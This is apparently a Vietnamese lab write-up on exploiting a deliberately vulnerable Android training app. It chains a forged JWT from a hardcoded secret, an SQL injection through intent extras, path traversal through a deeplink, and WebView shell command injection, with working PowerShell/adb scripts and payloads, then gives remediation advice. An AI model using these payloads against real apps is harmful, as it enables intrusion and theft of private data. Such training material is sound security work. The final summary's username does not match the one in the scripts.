# Blogger APK Lab Report

Ngày thực hiện: 2026-10-11  
Thiết bị: Android Emulator `emulator-5554`  
Package: `com.emapt.blogger`  
APK: `blogger.apk`  
Solution tham chiếu: `solution-lite.md`

## 1. Mục tiêu

Thực hiện lại chuỗi khai thác trong `solution-lite.md` trên app local `blogger.apk`:

```text
SQL Injection -> Path Traversal -> Command Injection (RCE) -> đọc flag
```

Kết quả cuối cùng cần chứng minh:

- Bypass authentication bằng SQL Injection qua `RegisterActivity`.
- Ghi đè `files/webview/index.html` bằng Path Traversal qua deeplink `ProfileActivity`.
- Kích hoạt JavaScript trong `WebViewActivity` để gọi `Android.writeLog()`.
- Thực thi command injection dưới UID của app và copy `secret.txt` ra external storage.

## 2. Chuẩn bị và reverse APK

### 2.1. Công cụ

Các công cụ khả dụng trong môi trường:

```text
adb.exe
apktool.bat
java.exe
openssl.exe
sqlite3.exe
```

`jadx` không có sẵn, nên phần reverse được thực hiện bằng `apktool` và đọc smali.

### 2.2. Decompile APK

```powershell
apktool.bat d -f -o blogger_decoded blogger.apk
```

Kết quả decompile thành công tại thư mục:

```text
blogger_decoded/
```

### 2.3. Thiết bị/emulator

```powershell
adb.exe devices -l
adb.exe shell getprop ro.build.version.sdk
```

Kết quả:

```text
emulator-5554 device product:sdk_gphone64_x86_64 model:sdk_gphone64_x86_64
SDK: 31
```

## 3. Static analysis

### 3.1. Manifest và exported components

Trong `blogger_decoded/AndroidManifest.xml`:

```xml
<manifest package="com.emapt.blogger">
    <application android:debuggable="true" android:name="com.emapt.blogger.BloggerApp">
        <activity android:exported="true" android:name="com.emapt.blogger.RegisterActivity" />
        <activity android:exported="true" android:name="com.emapt.blogger.ProfileActivity">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:host="profile" android:pathPrefix="/changeProfileImage" android:scheme="blogger"/>
            </intent-filter>
        </activity>
        <activity android:exported="true" android:name="com.emapt.blogger.WebViewActivity" />
    </application>
</manifest>
```

Các activity cần khai thác đều exported:

- `com.emapt.blogger.RegisterActivity`
- `com.emapt.blogger.ProfileActivity`
- `com.emapt.blogger.WebViewActivity`

### 3.2. JWT secret

Trong `TokenUtils.smali`:

```text
.field private static final ENCODED_SECRET:Ljava/lang/String; = "ZU1BUFRfczNjcjN0X2szeTJfMjAyNCE="
```

Decode Base64:

```text
ZU1BUFRfczNjcjN0X2szeTJfMjAyNCE= -> eMAPT_s3cr3t_k3y2_2024!
```

Token sử dụng:

- Header: `{"alg":"HS256","typ":"JWT"}`
- Payload: `{"sub":"<username>","iat":<unix_ts>,"exp":<unix_ts>}`
- Signature: `HMAC-SHA256(header.payload, secret)`
- Encoding: Base64 URL-safe, no padding

`verifyToken()` chỉ kiểm tra:

- token có 3 phần
- signature hợp lệ
- `exp` lớn hơn thời gian hiện tại

Không thấy kiểm tra claim `sub` có khớp username hay không.

### 3.3. SQL Injection trong RegisterActivity/DatabaseHelper

`RegisterActivity` đọc extras:

```text
username = getStringExtra("username")
password = getStringExtra("password")
```

Nếu cả hai tồn tại, activity tự gọi `performClick()` để submit.

Trong `DatabaseHelper.registerUser()`:

```text
INSERT INTO users (username, password, status) VALUES ('<username>', '<password>', 'inactive')
```

Sau đó app gọi:

```text
sql.split(";")
db.execSQL(stmt.trim())
```

DB schema:

```sql
CREATE TABLE users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT,
  password TEXT,
  status TEXT DEFAULT 'inactive'
);

CREATE TABLE tokens (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT,
  access_token TEXT
);
```

Sau khi `registerUser()` thành công, `RegisterActivity` gọi:

```text
AuthUtils.saveUsername(context, username)
```

Vì vậy SQLi có thể vừa tạo user active vừa insert token hợp lệ.

### 3.4. Auth check

Trong `AuthUtils.checkAuth()`:

1. Đọc `username` từ `blogger_prefs`.
2. Lấy token trong bảng `tokens`.
3. Lấy status trong bảng `users`.
4. Cho phép truy cập nếu:

```text
token != null && TokenUtils.verifyToken(token) && status == "active"
```

### 3.5. Path Traversal trong ProfileActivity

`ProfileActivity.handleDeeplink()` xử lý URI:

```text
blogger://profile/changeProfileImage?name=<name>&b64content=<base64>
```

Logic smali tương ứng:

```text
name = data.getQueryParameter("name")
b64content = data.getQueryParameter("b64content")
content = Base64.decode(b64content, 0)
imagesDir = new File(getFilesDir(), "images")
outputFile = new File(imagesDir, name)
parentDir.mkdirs()
new FileOutputStream(outputFile).write(content)
```

`name` không được sanitize. Vì vậy `../webview/index.html` sẽ ghi ra:

```text
/data/data/com.emapt.blogger/files/webview/index.html
```

### 3.6. Command Injection trong WebViewActivity

`WebViewActivity` bật các setting nguy hiểm:

```text
setJavaScriptEnabled(true)
setAllowFileAccess(true)
setAllowFileAccessFromFileURLs(true)
setAllowUniversalAccessFromFileURLs(true)
addJavascriptInterface(new BloggerJSInterface(), "Android")
```

WebView load:

```text
file:///data/data/com.emapt.blogger/files/webview/index.html
```

`BloggerJSInterface.writeLog(content)` thực thi:

```text
/system/bin/sh -c "echo " + content + " >> /data/data/com.emapt.blogger/files/app.log"
```

Nếu `content` chứa `;`, có thể kết thúc lệnh `echo` và chèn lệnh tùy ý.

### 3.7. Flag generation

Trong `BloggerApp.initSecretFile()`:

```text
files/secret.txt
```

được tạo với format:

```text
eMAPT{<random_hex_16_bytes>}
```

Flag thay đổi theo lần cài đặt/app data mới.

## 4. Khai thác

### 4.1. Bước 1 - Craft JWT hợp lệ

JWT hợp lệ cần các điểm sau:

- Secret HS256 là plaintext `eMAPT_s3cr3t_k3y2_2024!`.
- Header là `{"alg":"HS256","typ":"JWT"}`.
- Payload có dạng `{"sub":"<username>","iat":<unix_ts>,"exp":<unix_ts>}`.
- `exp` phải lớn hơn thời gian hiện tại của emulator.
- Nếu dùng jwt.io, tắt tùy chọn `BASE64URL ENCODED` ở ô secret.

Trong hướng dẫn chạy lại bên dưới, script PowerShell ở mục 4.2 sẽ tự lấy thời gian emulator và tự ký JWT cho `$user = "hieupm"`, nên không cần copy token thủ công từ jwt.io.

### 4.2. Bước 2 - SQL Injection qua RegisterActivity

Chạy các lệnh dưới đây trong **PowerShell**. Không dùng trực tiếp single quote kiểu Linux trong `cmd.exe`, vì `&`, `;`, `)`, `'` trong payload sẽ bị Windows shell hoặc Android shell parse sai.

Đoạn này tự tạo JWT HS256 đúng format của app, sau đó bọc payload bằng `ShQuote()` để gửi qua `adb shell` an toàn:

```powershell
function B64Url([byte[]]$bytes) {
  return [Convert]::ToBase64String($bytes).TrimEnd('=').Replace('+','-').Replace('/','_')
}

function ShQuote([string]$s) {
  return "'" + $s.Replace("'", "'\''") + "'"
}

$pkg = "com.emapt.blogger"
$user = "hieupm"
$secret = "eMAPT_s3cr3t_k3y2_2024!"

$now = [int64]((& adb.exe shell date +%s).Trim())
$exp = $now + 31536000

$header = '{"alg":"HS256","typ":"JWT"}'
$payloadJson = '{"sub":"' + $user + '","iat":' + $now + ',"exp":' + $exp + '}'

$content = (B64Url([System.Text.Encoding]::UTF8.GetBytes($header))) + "." +
           (B64Url([System.Text.Encoding]::UTF8.GetBytes($payloadJson)))

$hmac = New-Object System.Security.Cryptography.HMACSHA256
$hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($secret)
$sig = B64Url($hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($content)))
$jwt = $content + "." + $sig

$sqlPayload = "x','active');INSERT/**/INTO/**/tokens(username,access_token)VALUES('$user','$jwt')--"

adb.exe shell "am start -n $pkg/.RegisterActivity --es username $user --es password $(ShQuote $sqlPayload)"
```

Payload SQLi sau khi ghép vào query gốc tạo đúng 2 statement:

```sql
INSERT INTO users (username, password, status)
VALUES ('hieupm', 'x','active')
```

```sql
INSERT INTO tokens(username,access_token)
VALUES('hieupm','<jwt>')--', 'inactive')
```

Kết quả mong đợi:

```text
Starting: Intent { cmp=com.emapt.blogger/.RegisterActivity (has extras) }
```

Kiểm chứng `SharedPreferences`:

```powershell
adb.exe shell run-as com.emapt.blogger cat shared_prefs/blogger_prefs.xml
```

Kết quả cần có:

```xml
<string name="username">hieupm</string>
```

Kiểm chứng DB bằng `strings`:

```powershell
adb.exe shell run-as com.emapt.blogger strings databases/blogger.db | findstr "hieupm active eyJhbGci"
```

Cần thấy user `hieupm`, trạng thái `active`, và JWT bắt đầu bằng `eyJhbGci...` trong DB.

Kiểm chứng auth:

```powershell
adb.exe shell am start -n com.emapt.blogger/.ProfileActivity
adb.exe shell dumpsys activity activities | findstr "mResumedActivity"
```

Nếu auth bypass thành công, activity foreground là `com.emapt.blogger/.ProfileActivity`, không phải `LoginActivity`.

### 4.3. Bước 3 - Path Traversal ghi đè webview/index.html

Payload HTML sửa đúng path private storage:

```text
/data/data/com.emapt.blogger/files/secret.txt
```

Không dùng path sai:

```text
/data/data/data/com.emapt.blogger/files/secret.txt
```

Chạy trong PowerShell:

```powershell
function ShQuote([string]$s) {
  return "'" + $s.Replace("'", "'\''") + "'"
}

$pkg = "com.emapt.blogger"

adb.exe shell rm -f /sdcard/Download/blogger_flag.txt

$cmd = 'X; cat /data/data/com.emapt.blogger/files/secret.txt > /sdcard/Download/blogger_flag.txt; #'

$html = '<!doctype html><html><body><script>(function(){Android.writeLog("' + $cmd + '");})();</script></body></html>'

$b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($html))

$name = [Uri]::EscapeDataString('../webview/index.html')
$b64e = [Uri]::EscapeDataString($b64)

$uri = "blogger://profile/changeProfileImage?name=$name&b64content=$b64e"

adb.exe shell "am start -a android.intent.action.VIEW -n $pkg/.ProfileActivity -d $(ShQuote $uri)"
```

Các điểm quan trọng:

- `name` phải là `../webview/index.html`.
- `b64content` phải được URL-encode bằng `[Uri]::EscapeDataString($b64)`.
- Nếu Base64 còn dấu `+` trong URI raw, `Uri.getQueryParameter()` có thể biến `+` thành space và làm decode hỏng.
- Không tách URI bằng dấu quote thủ công quanh riêng `b64content`; toàn bộ URI phải là một argument của `-d`.

Kiểm chứng file bị ghi đè:

```powershell
adb.exe shell run-as com.emapt.blogger ls -la files/webview/index.html
adb.exe shell run-as com.emapt.blogger cat files/webview/index.html
```

Nội dung cần thấy:

```html
<!doctype html><html><body><script>(function(){Android.writeLog("X; cat /data/data/com.emapt.blogger/files/secret.txt > /sdcard/Download/blogger_flag.txt; #");})();</script></body></html>
```

### 4.4. Bước 4 - Kích hoạt RCE qua WebViewActivity

Reload app để WebView đọc lại file `index.html` vừa bị ghi đè:

```powershell
adb.exe shell am force-stop com.emapt.blogger
adb.exe shell am start -n com.emapt.blogger/.WebViewActivity
Start-Sleep -Seconds 3
```

Kiểm tra `WebViewActivity` đang foreground:

```powershell
adb.exe shell dumpsys activity activities | findstr "mResumedActivity"
```

Kết quả mong đợi:

```text
com.emapt.blogger/.WebViewActivity
```

Khi WebView load file đã bị poison, JavaScript gọi:

```js
Android.writeLog("X; cat /data/data/com.emapt.blogger/files/secret.txt > /sdcard/Download/blogger_flag.txt; #")
```

Command thực tế trong shell trở thành:

```sh
echo X; cat /data/data/com.emapt.blogger/files/secret.txt > /sdcard/Download/blogger_flag.txt; # >> /data/data/com.emapt.blogger/files/app.log
```

Dấu `#` comment phần redirect `>> app.log`, nên output chính là:

```text
/sdcard/Download/blogger_flag.txt
```

Nếu sau `force-stop` app bị redirect về `LoginActivity`, chạy lại bước SQLi ở mục 4.2 rồi start lại `WebViewActivity`.

## 5. Kết quả

Đọc flag:

```powershell
adb.exe shell cat /sdcard/Download/blogger_flag.txt
```

Kết quả:

```text
eMAPT{c62084fbb7108ad86584fa6e5fab92b7}
```

Flag cũng được đối chiếu bằng `run-as` khi kiểm chứng nội bộ:

```powershell
adb.exe shell run-as com.emapt.blogger cat files/secret.txt
```

Kết quả trùng khớp:

```text
eMAPT{c62084fbb7108ad86584fa6e5fab92b7}
```

Lưu ý: bước lấy flag chính của chain là đọc từ `/sdcard/Download/blogger_flag.txt`. Việc đọc `files/secret.txt` bằng `run-as` chỉ dùng để đối chiếu trong môi trường lab vì app có `android:debuggable="true"`.

## 6. Tổng kết chuỗi khai thác

```text
1. Reverse APK bằng apktool
2. Tìm JWT secret:
   ZU1BUFRfczNjcjN0X2szeTJfMjAyNCE= -> eMAPT_s3cr3t_k3y2_2024!
3. Craft JWT HS256 hợp lệ cho username emapt_codex
4. Gửi Intent tới RegisterActivity với SQLi password payload
5. SQLi tạo user active và insert token vào bảng tokens
6. RegisterActivity lưu username vào SharedPreferences
7. AuthUtils.checkAuth() pass
8. Gửi deeplink ProfileActivity với name=../webview/index.html
9. Path traversal ghi đè files/webview/index.html
10. Start WebViewActivity
11. WebView load malicious HTML, JS gọi Android.writeLog()
12. writeLog() nối content vào sh -c, dẫn đến command injection
13. cat secret.txt > /sdcard/Download/blogger_flag.txt
14. Đọc flag từ external storage
```

## 7. Root cause và khuyến nghị khắc phục

### SQL Injection

Root cause:

- Ghép chuỗi SQL trực tiếp từ input.
- Cho phép multi-statement bằng `split(";")`.
- Activity exported và auto-submit extras.

Khuyến nghị:

- Dùng `SQLiteDatabase.insert()` hoặc prepared statements/parameterized queries.
- Không tự split SQL theo `;`.
- Không auto-submit dữ liệu từ external intent.
- Nếu activity không cần public, đặt `android:exported="false"`.

### Path Traversal

Root cause:

- Dùng query parameter `name` trực tiếp làm path.
- Không canonicalize và không kiểm tra file nằm trong thư mục `images`.

Khuyến nghị:

- Chỉ cho phép basename hợp lệ, ví dụ `profile.png`.
- Resolve canonical path rồi kiểm tra `outputFile.getCanonicalPath().startsWith(imagesDir.getCanonicalPath())`.
- Từ chối `../`, `/`, `%2f`, path absolute, symlink edge cases.

### WebView RCE

Root cause:

- Bật JavaScript và file access cho local file.
- Expose `JavascriptInterface`.
- Đưa input JS vào `Runtime.exec("/system/bin/sh", "-c", ...)` không sanitize.

Khuyến nghị:

- Không expose interface nhạy cảm cho WebView trừ khi thật sự cần.
- Không gọi shell bằng input người dùng.
- Nếu cần log, dùng Android logging hoặc ghi file qua Java API.
- Tắt `setAllowFileAccessFromFileURLs` và `setAllowUniversalAccessFromFileURLs`.
- Load nội dung tĩnh từ asset an toàn, tránh để file trong private storage bị ghi đè bởi flow upload.

## 8. Artifact chính

- Decompile output: `blogger_decoded/`
- Report: `blogger-lab-report.md`
- Flag exfiltrated: `/sdcard/Download/blogger_flag.txt`
- Final flag:

```text
eMAPT{c62084fbb7108ad86584fa6e5fab92b7}
```

```powershell
function ShQuote([string]$s) {
  return "'" + $s.Replace("'", "'\''") + "'"
}

adb.exe shell rm -f /sdcard/Download/blogger_flag.txt

$cmd = 'X; cat /data/data/com.emapt.blogger/files/secret.txt > /sdcard/Download/blogger_flag.txt; #'

$html = '<!doctype html><html><body><script>(function(){Android.writeLog("' + $cmd + '");})();</script></body></html>'

$b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($html))

$name = [Uri]::EscapeDataString('../webview/index.html')
$b64e = [Uri]::EscapeDataString($b64)

$uri = "blogger://profile/changeProfileImage?name=$name&b64content=$b64e"

adb.exe shell "am start -a android.intent.action.VIEW -n com.emapt.blogger/.ProfileActivity -d $(ShQuote $uri)"
```